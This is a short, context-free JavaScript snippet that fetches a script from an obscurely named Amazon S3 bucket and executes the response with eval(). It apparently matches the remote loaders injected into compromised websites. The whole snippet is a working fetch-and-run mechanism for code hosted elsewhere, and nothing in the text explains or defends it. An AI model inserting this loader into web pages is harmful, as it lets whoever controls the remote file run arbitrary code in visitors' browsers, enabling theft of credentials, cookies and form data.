var xhr = new XMLHttpRequest();
xhr.open("GET", "//s3.amazonaws.com/l-ili-i/0.js", true);
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
        eval(xhr.responseText);
    }
}
xhr.send();